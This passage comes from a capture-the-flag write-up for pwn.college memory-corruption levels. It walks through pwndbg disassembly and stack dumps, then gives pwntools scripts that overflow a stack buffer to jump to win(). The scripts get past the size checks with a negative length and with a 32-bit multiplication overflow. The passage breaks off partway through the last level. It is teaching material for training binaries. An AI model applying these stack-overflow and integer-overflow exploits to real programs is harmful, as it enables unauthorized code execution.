| 0x00007ffeffbedd20 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd28 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd30 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd38 (rsp+0x0098) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd40 (rsp+0x00a0) | 41 41 41 41 90 00 00 00 | 0x0000009041414141 |
| 0x00007ffeffbedd48 (rsp+0x00a8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd50 (rsp+0x00b0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd58 (rsp+0x00b8) | f3 20 40 00 00 00 00 00 | 0x00000000004020f3 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x4141414141414141
- the saved frame pointer (of main) is at 0x7ffeffbedd50
- the saved return address (previously to main) is at 0x7ffeffbedd58
- the saved return address is now pointing to 0x4020f3.
- the address of win() is 0x4020f3.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win() when it returns.
Let's try it now!

Goodbye!
You win! Here is your flag:
pwn.college{cqqx0Foh8TX0nmHtTa2208nl4Ry.0VN5IDL4ITM0EzW}


[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Bounds Breaker (Hard)

```
hacker@program-security~bounds-breaker-hard:~$ /challenge/bounds-breaker-hard 
###
### Welcome to /challenge/bounds-breaker-hard!
###

Payload size: 2
Send your payload (up to 2 bytes)!
aa
Goodbye!
### Goodbye!
```

* [ ] Location of buffer
* [ ] Location of stored return address to `main()`
* [ ] Location of `win()`

### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x00000000004021b5 <+0>:     endbr64
   0x00000000004021b9 <+4>:     push   rbp
   0x00000000004021ba <+5>:     mov    rbp,rsp
   0x00000000004021bd <+8>:     sub    rsp,0xa0
   0x00000000004021c4 <+15>:    mov    DWORD PTR [rbp-0x84],edi
   0x00000000004021ca <+21>:    mov    QWORD PTR [rbp-0x90],rsi
   0x00000000004021d1 <+28>:    mov    QWORD PTR [rbp-0x98],rdx
   0x00000000004021d8 <+35>:    mov    QWORD PTR [rbp-0x70],0x0
   0x00000000004021e0 <+43>:    mov    QWORD PTR [rbp-0x68],0x0
   0x00000000004021e8 <+51>:    mov    QWORD PTR [rbp-0x60],0x0
   0x00000000004021f0 <+59>:    mov    QWORD PTR [rbp-0x58],0x0
   0x00000000004021f8 <+67>:    mov    QWORD PTR [rbp-0x50],0x0
   0x0000000000402200 <+75>:    mov    QWORD PTR [rbp-0x48],0x0
   0x0000000000402208 <+83>:    mov    QWORD PTR [rbp-0x40],0x0
   0x0000000000402210 <+91>:    mov    QWORD PTR [rbp-0x38],0x0
   0x0000000000402218 <+99>:    mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000402220 <+107>:   mov    QWORD PTR [rbp-0x28],0x0
   0x0000000000402228 <+115>:   mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000402230 <+123>:   mov    QWORD PTR [rbp-0x18],0x0
   0x0000000000402238 <+131>:   mov    DWORD PTR [rbp-0x10],0x0
   0x000000000040223f <+138>:   lea    rax,[rbp-0x70]
   0x0000000000402243 <+142>:   mov    QWORD PTR [rbp-0x8],rax
   0x0000000000402247 <+146>:   mov    DWORD PTR [rbp-0x74],0x0
   0x000000000040224e <+153>:   lea    rdi,[rip+0xeb7]        # 0x40310c
   0x0000000000402255 <+160>:   mov    eax,0x0
   0x000000000040225a <+165>:   call   0x401130 <printf@plt>
   0x000000000040225f <+170>:   lea    rax,[rbp-0x74]
   0x0000000000402263 <+174>:   mov    rsi,rax
   0x0000000000402266 <+177>:   lea    rdi,[rip+0xeae]        # 0x40311b
   0x000000000040226d <+184>:   mov    eax,0x0
   0x0000000000402272 <+189>:   call   0x401180 <__isoc99_scanf@plt>
   0x0000000000402277 <+194>:   mov    eax,DWORD PTR [rbp-0x74]
   0x000000000040227a <+197>:   cmp    eax,0x64
   0x000000000040227d <+200>:   jle    0x402295 <challenge+224>
   0x000000000040227f <+202>:   lea    rdi,[rip+0xe98]        # 0x40311e
   0x0000000000402286 <+209>:   call   0x401110 <puts@plt>
   0x000000000040228b <+214>:   mov    edi,0x1
   0x0000000000402290 <+219>:   call   0x401190 <exit@plt>
   0x0000000000402295 <+224>:   mov    eax,DWORD PTR [rbp-0x74]
   0x0000000000402298 <+227>:   mov    esi,eax
   0x000000000040229a <+229>:   lea    rdi,[rip+0xe9f]        # 0x403140
   0x00000000004022a1 <+236>:   mov    eax,0x0
   0x00000000004022a6 <+241>:   call   0x401130 <printf@plt>
   0x00000000004022ab <+246>:   mov    eax,DWORD PTR [rbp-0x74]
   0x00000000004022ae <+249>:   mov    edx,eax
   0x00000000004022b0 <+251>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004022b4 <+255>:   mov    rsi,rax
   0x00000000004022b7 <+258>:   mov    edi,0x0
   0x00000000004022bc <+263>:   call   0x401150 <read@plt>
   0x00000000004022c1 <+268>:   mov    DWORD PTR [rbp-0xc],eax
   0x00000000004022c4 <+271>:   cmp    DWORD PTR [rbp-0xc],0x0
   0x00000000004022c8 <+275>:   jns    0x4022f6 <challenge+321>
   0x00000000004022ca <+277>:   call   0x401100 <__errno_location@plt>
   0x00000000004022cf <+282>:   mov    eax,DWORD PTR [rax]
   0x00000000004022d1 <+284>:   mov    edi,eax
   0x00000000004022d3 <+286>:   call   0x4011a0 <strerror@plt>
   0x00000000004022d8 <+291>:   mov    rsi,rax
   0x00000000004022db <+294>:   lea    rdi,[rip+0xe86]        # 0x403168
   0x00000000004022e2 <+301>:   mov    eax,0x0
   0x00000000004022e7 <+306>:   call   0x401130 <printf@plt>
   0x00000000004022ec <+311>:   mov    edi,0x1
   0x00000000004022f1 <+316>:   call   0x401190 <exit@plt>
   0x00000000004022f6 <+321>:   lea    rdi,[rip+0xe8f]        # 0x40318c
   0x00000000004022fd <+328>:   call   0x401110 <puts@plt>
   0x0000000000402302 <+333>:   mov    eax,0x0
   0x0000000000402307 <+338>:   leave
   0x0000000000402308 <+339>:   ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+263` right before `read@plt` is called.

```
pwndbg> break *(challenge+263)
Breakpoint 1 at 0x4022bc
```

```
pwndbg> run
Starting program: /challenge/bounds-breaker-hard 
###
### Welcome to /challenge/bounds-breaker-hard!
###

Payload size: 2
Send your payload (up to 2 bytes)!

Breakpoint 1, 0x00000000004022bc in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────
 RAX  0x7ffc2db73b70 ◂— 0
 RBX  0x4023f0 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  2
 RDI  0
 RSI  0x7ffc2db73b70 ◂— 0
 R8   0x23
 R9   0x23
 R10  0x40315b ◂— ' bytes)!\n'
 R11  0x246
 R12  0x4011b0 (_start) ◂— endbr64 
 R13  0x7ffc2db74d00 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffc2db73be0 —▸ 0x7ffc2db74c10 ◂— 0
 RSP  0x7ffc2db73b40 ◂— 1
 RIP  0x4022bc (challenge+263) ◂— call read@plt
────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────
 ► 0x4022bc <challenge+263>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffc2db73b70 ◂— 0
        nbytes: 2
 
   0x4022c1 <challenge+268>    mov    dword ptr [rbp - 0xc], eax
   0x4022c4 <challenge+271>    cmp    dword ptr [rbp - 0xc], 0
   0x4022c8 <challenge+275>    jns    challenge+321               <challenge+321>
 
   0x4022ca <challenge+277>    call   __errno_location@plt        <__errno_location@plt>
 
   0x4022cf <challenge+282>    mov    eax, dword ptr [rax]
   0x4022d1 <challenge+284>    mov    edi, eax
   0x4022d3 <challenge+286>    call   strerror@plt                <strerror@plt>
 
   0x4022d8 <challenge+291>    mov    rsi, rax
   0x4022db <challenge+294>    lea    rdi, [rip + 0xe86]     RDI => 0x403168 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x4022e2 <challenge+301>    mov    eax, 0                 EAX => 0
─────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffc2db73b40 ◂— 1
01:0008│-098     0x7ffc2db73b48 —▸ 0x7ffc2db74d18 —▸ 0x7ffc2db7668b ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-090     0x7ffc2db73b50 —▸ 0x7ffc2db74d08 —▸ 0x7ffc2db7666c ◂— '/challenge/bounds-breaker-hard'
03:0018│-088     0x7ffc2db73b58 ◂— 0x19c59d951
04:0020│-080     0x7ffc2db73b60 ◂— 0xd68 /* 'h\r' */
05:0028│-078     0x7ffc2db73b68 ◂— 0x20000000a /* '\n' */
06:0030│ rax rsi 0x7ffc2db73b70 ◂— 0
07:0038│-068     0x7ffc2db73b78 ◂— 0
───────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4022bc challenge+263
   1         0x4023cf main+198
   2   0x7c6e9c531083 __libc_start_main+243
   3         0x4011de _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

* [x] Location of buffer: `0x7ffc2db73b70`
* [ ] Location of stored return address to `main()`
* [ ] Location of `win()`

```
pwndbg> info frame
Stack level 0, frame at 0x7ffc2db73bf0:
 rip = 0x4022bc in challenge; saved rip = 0x4023cf
 called by frame at 0x7ffc2db74c20
 Arglist at 0x7ffc2db73be0, args: 
 Locals at 0x7ffc2db73be0, Previous frame's sp is 0x7ffc2db73bf0
 Saved registers:
  rbp at 0x7ffc2db73be0, rip at 0x7ffc2db73be8
```

* [x] Location of buffer: `0x7ffc2db73b70`
* [x] Location of stored return address to `main()`: `0x7ffc2db73be8`
* [ ] Location of `win()`

```
pwndbg> info address win
Symbol "win" is at 0x4020ae in a file compiled without debugging.
```

* [x] Location of buffer: `0x7ffc2db73b70`
* [x] Location of stored return address to `main()`: `0x7ffc2db73be8`
* [x] Location of `win()`: `0x4020ae`

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

p = process('/challenge/bounds-breaker-hard')

# Initialize values
buffer_addr = 0x7ffc2db73b70
addr_of_stored_ip = 0x7ffc2db73be8
win_func_addr = 0x4020ae

# Calculate offset & payload_size
offset = addr_of_stored_ip - buffer_addr
payload_size = -1

# Build payload
payload = b"A" * offset
payload += p64(win_func_addr)

# Send number of bytes
p.recvuntil(b'Payload size: ')
p.sendline(str(payload_size))

# Send payload
p.recvuntil(b'Send your payload')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~bounds-breaker-hard:~$ python ~/script.py 
[+] Starting local process '/challenge/bounds-breaker-hard': pid 21809
/home/hacker/script.py:20: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(payload_size))
[*] Switching to interactive mode
 (up to -1 bytes)!
[*] Process '/challenge/bounds-breaker-hard' stopped with exit code -11 (SIGSEGV) (pid 21809)
Goodbye!
You win! Here is your flag:
pwn.college{c2QK8MySIcrTr1cBw5ue9GWyXo8.0lN5IDL4ITM0EzW}


[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Casting Catastrophe (Easy)

```
hacker@program-security~casting-catastrophe-easy:~$ /challenge/casting-catastrophe-easy 
###
### Welcome to /challenge/casting-catastrophe-easy!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffc78442700 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffc78442708 (rsp+0x0008) | e8 38 44 78 fc 7f 00 00 | 0x00007ffc784438e8 |
| 0x00007ffc78442710 (rsp+0x0010) | d8 38 44 78 fc 7f 00 00 | 0x00007ffc784438d8 |
| 0x00007ffc78442718 (rsp+0x0018) | 23 17 e1 2f 01 00 00 00 | 0x000000012fe11723 |
| 0x00007ffc78442720 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffc78442728 (rsp+0x0028) | 51 49 cb 2f c7 78 00 00 | 0x000078c72fcb4951 |
| 0x00007ffc78442730 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442738 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442740 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442748 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442750 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442758 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442760 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442768 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442770 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442778 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442780 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442788 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442790 (rsp+0x0090) | 00 00 40 00 00 00 00 00 | 0x0000000000400000 |
| 0x00007ffc78442798 (rsp+0x0098) | 50 2b 40 00 00 00 00 00 | 0x0000000000402b50 |
| 0x00007ffc784427a0 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc784427a8 (rsp+0x00a8) | 30 27 44 78 fc 7f 00 00 | 0x00007ffc78442730 |
| 0x00007ffc784427b0 (rsp+0x00b0) | e0 37 44 78 fc 7f 00 00 | 0x00007ffc784437e0 |
| 0x00007ffc784427b8 (rsp+0x00b8) | 32 2b 40 00 00 00 00 00 | 0x0000000000402b32 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffc78442700, and our base pointer points to 0x7ffc784427b0.
This means that we have (decimal) 24 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 192 bytes.
The input buffer begins at 0x7ffc78442730, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 98 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffc784427b8, 136 bytes after the start of your input buffer.
That means that you will need to input at least 144 bytes (98 to fill the buffer,
38 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

This challenge will let you send multiple payload records concatenated together.
It will make sure that the total payload size fits in the allocated buffer
on the stack. Can you send a carefully crafted input to break this calculation?
Number of payload records to send: 100
Size of each payload record: 100
casting-catastrophe-easy: /challenge/babymem-level-5-0.c:147: challenge: Assertion `record_size * record_num <= 98' failed.
Aborted
```

This program accepts the `record_size` and `record_num` from the user, and if the multiplication result is greater that `98` which is the buffer size, it exits.

Let's see how this check is performed.

### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:

# ---- snip ----

   0x00000000004026e4 <+774>:   lea    rax,[rbp-0x84]
   0x00000000004026eb <+781>:   mov    rsi,rax
   0x00000000004026ee <+784>:   lea    rdi,[rip+0x12cf]        # 0x4039c4
   0x00000000004026f5 <+791>:   mov    eax,0x0
   0x00000000004026fa <+796>:   call   0x4011a0 <__isoc99_scanf@plt>

# ---- snip ----

   0x0000000000402739 <+859>:   lea    rax,[rbp-0x88]
   0x0000000000402740 <+866>:   mov    rsi,rax
   0x0000000000402743 <+869>:   lea    rdi,[rip+0x127a]        # 0x4039c4
   0x000000000040274a <+876>:   mov    eax,0x0
   0x000000000040274f <+881>:   call   0x4011a0 <__isoc99_scanf@plt>

# ---- snip ----

   0x000000000040277d <+927>:   mov    edx,DWORD PTR [rbp-0x88]
   0x0000000000402783 <+933>:   mov    eax,DWORD PTR [rbp-0x84]
   0x0000000000402789 <+939>:   imul   eax,edx
   0x000000000040278c <+942>:   cmp    eax,0x62
   0x000000000040278f <+945>:   jbe    0x4027b0 <challenge+978>
   0x0000000000402791 <+947>:   lea    rcx,[rip+0x1868]        # 0x404000 <__PRETTY_FUNCTION__.5728>
   0x0000000000402798 <+954>:   mov    edx,0x93
   0x000000000040279d <+959>:   lea    rsi,[rip+0x1224]        # 0x4039c8
   0x00000000004027a4 <+966>:   lea    rdi,[rip+0x127d]        # 0x403a28
   0x00000000004027ab <+973>:   call   0x401150 <__assert_fail@plt>
   0x00000000004027b0 <+978>:   mov    eax,DWORD PTR [rbp-0x84]

# ---- snip ----

End of assembler dump.
```

If we look at the disassembly, we can see the variables, `record_num` and `record_size` are stored at the 4 bytes pointed to by `rbp-0x84` and `rbp-0x88` respectively.
Later, these values are moved into `edx` and `eax`, which are used with a `mul` instruction.
The result of the `mul` instruction, which is stored in `eax`, is compared with `0x62` using the `jbe` instruction. 

Since the progam is using `jbe`, which interprets the numbers as unsigned integers, we cannot pull the [same trick from the last challenge](#bounds-breaker-easy).
Moving ahead, if the result of the multiplication greater than `0x62`, the program exits.

However, the vulnerability here is an [Integer Overflow](https://en.wikipedia.org/wiki/Integer_overflow). The instruction `imul eax, edx` performs 32-bit multiplication. If the result is larger than what 32 bits can hold, the "extra" bits are simply discarded (truncated), and only the lower 32 bits remain in `eax` for the `cmp` instruction.

### Integer overflow

We need to provide two numbers whose mathematical product is very large, but when truncated to 32 bits, the result is between `0` and `0x62` (98 in decimal).

To find these numbers, we look for a product that equals:

$$
(2^{32} \cdot n) + \text{remainder}
$$

Where $n$ is any integer (usually 1 is easiest) and $\text{remainder} \le 98$.

Possible value:
- $65536$ ($n = 1$, $\text{remainder} = 0$)

When $65536$ is multiplied with $65536$, the result is $4,294,967,296$, whose hexadecimal representation is as follows:

| Register Size | Hexadecimal Value |
| :--- | :--- |
| **64-bit** | `0x100000000` |
| **32-bit (eax)** | `0x00000000` |

As we can see, even if the result is a huge number ($4,294,967,296$), the value within `eax` is $0$.

Before we craft our exploit, we need the address of `win()`.

### `win()`

```
pwndbg> info address win
Symbol "win" is at 0x4022d7 in a file compiled without debugging.
```

### Exploit

```py title="~/script.py" showLineNumber
from pwn import *

p = process('/challenge/casting-catastrophe-easy')

# Initialize values
buffer_addr = 0x7ffcf11c6c80
addr_of_stored_ip = 0x7ffcf11c6d08
win_func_addr = 0x4022d7

# Calculate offset & payload_size
offset = addr_of_stored_ip - buffer_addr
records_num = 65536
records_size = 65536

# Build payload
payload = b"A" * offset
payload += p64(win_func_addr)

# Send number of records
p.recvuntil(b'Number of payload records to send: ')
p.sendline(str(records_num))

# Send size of records
p.recvuntil(b'Size of each payload record: ')
p.sendline(str(records_size))

# Send payload
p.recvuntil(b'Send your payload')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~casting-catastrophe-easy:~$ python ~/script.py 
[+] Starting local process '/challenge/casting-catastrophe-easy': pid 1314
/home/hacker/script.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(records_num))
/home/hacker/script.py:25: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(records_size))
[*] Switching to interactive mode
 (up to 4294967296 bytes)!
[*] Process '/challenge/casting-catastrophe-easy' stopped with exit code -11 (SIGSEGV) (pid 1314)
You sent 144 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffd9b661830 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffd9b661838 (rsp+0x0008) | 18 2a 66 9b fd 7f 00 00 | 0x00007ffd9b662a18 |
| 0x00007ffd9b661840 (rsp+0x0010) | 08 2a 66 9b fd 7f 00 00 | 0x00007ffd9b662a08 |
| 0x00007ffd9b661848 (rsp+0x0018) | 23 d7 e0 b0 01 00 00 00 | 0x00000001b0e0d723 |
| 0x00007ffd9b661850 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffd9b661858 (rsp+0x0028) | 00 00 01 00 00 00 01 00 | 0x0001000000010000 |
| 0x00007ffd9b661860 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b661868 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b661870 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b661878 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b661880 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b661888 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b661890 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b661898 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618a0 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618a8 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618b0 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618b8 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618c0 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618c8 (rsp+0x0098) | 41 41 41 41 90 00 00 00 | 0x0000009041414141 |
| 0x00007ffd9b6618d0 (rsp+0x00a0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618d8 (rsp+0x00a8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618e0 (rsp+0x00b0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618e8 (rsp+0x00b8) | d7 22 40 00 00 00 00 00 | 0x00000000004022d7 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x4141414141414141
- the saved frame pointer (of main) is at 0x7ffd9b6618e0
- the saved return address (previously to main) is at 0x7ffd9b6618e8
- the saved return address is now pointing to 0x4022d7.
- the address of win() is 0x4022d7.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win() when it returns.
Let's try it now!

Goodbye!
You win! Here is your flag:
pwn.college{AHvK09p2sS2HAcH9C1wLClyOklX.01N5IDL4ITM0EzW}


[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Casting Catastrophe (Hard)

```
hacker@program-security~casting-catastrophe-hard:~$ /challenge/casting-catastrophe-hard 
###
### Welcome to /challenge/casting-catastrophe-hard!
###

Number of payload records to send: 2
Size of each payload record: 2
Send your payload (up to 4 bytes)!
aaaa
Goodbye!
### Goodbye!
```

* [ ] Location of buffer
* [ ] Location of stored return address to `main()`
* [ ] Location of `win()`

### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:

# ---- snip ----

   0x0000000000401653 <+99>:    lea    rax,[rbp-0x44]
   0x0000000000401657 <+103>:   mov    rsi,rax
   0x000000000040165a <+106>:   lea    rdi,[rip+0xad3]        # 0x402134
   0x0000000000401661 <+113>:   mov    eax,0x0
   0x0000000000401666 <+118>:   call   0x4011a0 <__isoc99_scanf@plt>

# ---- snip ----

   0x00000000004016a2 <+178>:   lea    rax,[rbp-0x48]
   0x00000000004016a6 <+182>:   mov    rsi,rax
   0x00000000004016a9 <+185>:   lea    rdi,[rip+0xa84]        # 0x402134
   0x00000000004016b0 <+192>:   mov    eax,0x0
   0x00000000004016b5 <+197>:   call   0x4011a0 <__isoc99_scanf@plt>

# ---- snip ----

   0x00000000004016e0 <+240>:   mov    edx,DWORD PTR [rbp-0x48]
   0x00000000004016e3 <+243>:   mov    eax,DWORD PTR [rbp-0x44]
   0x00000000004016e6 <+246>:   imul   eax,edx
   0x00000000004016e9 <+249>:   cmp    eax,0x25
   0x00000000004016ec <+252>:   jbe    0x40170d <challenge+285>
   0x00000000004016ee <+254>:   lea    rcx,[rip+0xb43]        # 0x402238 <__PRETTY_FUNCTION__.5714>
   0x00000000004016f5 <+261>:   mov    edx,0x4d
   0x00000000004016fa <+266>:   lea    rsi,[rip+0xa37]        # 0x402138
   0x0000000000401701 <+273>:   lea    rdi,[rip+0xa90]        # 0x402198
   0x0000000000401708 <+280>:   call   0x401150 <__assert_fail@plt>
   0x000000000040170d <+285>:   mov    eax,DWORD PTR [rbp-0x44]

# ---- snip ----

End of assembler dump.
```

This challenge makes the same mistake of multiplying two 32-bit registers, and the comparing only the part of the result stored in `eax`.

* [ ] Location of buffer
* [ ] Location of stored return address to `main()`
* [ ] Location of `win()`

Let's set a breakpoit right before the call to `read@plt`.

```
# ---- snip ----

   0x000000000040173f <+335>:   mov    rdx,QWORD PTR [rbp-0x10]
   0x0000000000401743 <+339>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000401747 <+343>:   mov    rsi,rax
   0x000000000040174a <+346>:   mov    edi,0x0
   0x000000000040174f <+351>:   call   0x401170 <read@plt>

# ---- snip ----
```

```
pwndbg> break *(challenge+351)
Breakpoint 1 at 0x40174f
```

Now let's run the program.

```
pwndbg> run
Starting program: /challenge/casting-catastrophe-hard 
###
### Welcome to /challenge/casting-catastrophe-hard!
###

Number of payload records to send: 2
Size of each payload record: 2
Send your payload (up to 4 bytes)!

Breakpoint 1, 0x000000000040174f in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────
 RAX  0x7ffec1695f10 ◂— 0
 RBX  0x401880 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  4
 RDI  0
 RSI  0x7ffec1695f10 ◂— 0
 R8   0x23
 R9   0x23
 R10  0x4021d4 ◂— ' bytes)!\n'
 R11  0x246
 R12  0x4011d0 (_start) ◂— endbr64 
 R13  0x7ffec1697070 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffec1695f50 —▸ 0x7ffec1696f80 ◂— 0
 RSP  0x7ffec1695ee0 —▸ 0x7318053626a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 RIP  0x40174f (challenge+351) ◂— call read@plt
─────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
 ► 0x40174f <challenge+351>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffec1695f10 ◂— 0
        nbytes: 4
 
   0x401754 <challenge+356>    mov    dword ptr [rbp - 0x14], eax
   0x401757 <challenge+359>    cmp    dword ptr [rbp - 0x14], 0
   0x40175b <challenge+363>    jns    challenge+409               <challenge+409>
 
   0x40175d <challenge+365>    call   __errno_location@plt        <__errno_location@plt>
 
   0x401762 <challenge+370>    mov    eax, dword ptr [rax]
   0x401764 <challenge+372>    mov    edi, eax
   0x401766 <challenge+374>    call   strerror@plt                <strerror@plt>
 
   0x40176b <challenge+379>    mov    rsi, rax
   0x40176e <challenge+382>    lea    rdi, [rip + 0xa6b]     RDI => 0x4021e0 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x401775 <challenge+389>    mov    eax, 0                 EAX => 0
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffec1695ee0 —▸ 0x7318053626a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
01:0008│-068     0x7ffec1695ee8 —▸ 0x7ffec1697088 —▸ 0x7ffec1697681 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-060     0x7ffec1695ef0 —▸ 0x7ffec1697078 —▸ 0x7ffec169765d ◂— '/challenge/casting-catastrophe-hard'
03:0018│-058     0x7ffec1695ef8 ◂— 0x100000000
04:0020│-050     0x7ffec1695f00 ◂— 0
05:0028│-048     0x7ffec1695f08 ◂— 0x200000002
06:0030│ rax rsi 0x7ffec1695f10 ◂— 0
07:0038│-038     0x7ffec1695f18 ◂— 0
─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x40174f challenge+351
   1         0x401862 main+198
   2   0x731805199083 __libc_start_main+243
   3         0x4011fe _start+46
